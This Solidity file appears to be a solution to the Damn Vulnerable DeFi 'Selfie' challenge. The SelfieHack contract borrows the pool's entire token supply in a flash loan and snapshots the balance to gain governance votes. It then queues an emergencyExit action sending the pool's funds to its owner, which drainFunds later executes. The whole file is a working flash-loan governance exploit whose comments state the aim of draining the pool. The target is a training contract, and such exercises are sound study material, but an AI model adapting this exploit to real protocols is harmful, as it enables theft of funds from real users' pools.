// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieHack is IERC3156FlashBorrower {
    SelfiePool selfiePool;
    SimpleGovernance governancePool;
    DamnValuableTokenSnapshot token;

    address owner;
    uint256 actionID;

    constructor(
        SelfiePool _selfiePool,
        SimpleGovernance _governancePool,
        DamnValuableTokenSnapshot _token
    ) {
        selfiePool = _selfiePool;
        governancePool = _governancePool;
        token = _token;

        owner = msg.sender;
    }

    function attack() public returns (uint256) {
        require(owner == msg.sender, "Only Owner");

        // Get the maximum tokens to borrow.
        uint256 maxAmount = selfiePool.maxFlashLoan(address(token));
        //Start flashloan for maximum
        selfiePool.flashLoan(
            IERC3156FlashBorrower(this),
            address(token),
            maxAmount,
            ""
        );
        // selfiePool will call `onFlashLoan()`s
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32) {
        //get snapshot to secure our current large balance in token memory
        token.snapshot();

        //get function data to drain contract
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            owner
        );

        //queue action the flashpool as target, no value, function data
        //saves the actionID
        actionID = governancePool.queueAction(address(selfiePool), 0, data);

        //repay the loan
        token.approve(address(selfiePool), _amount);

        //return the key hash
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function drainFunds() external {
        //calls to execute the drain function to owner address
        governancePool.executeAction(actionID);
    }
}
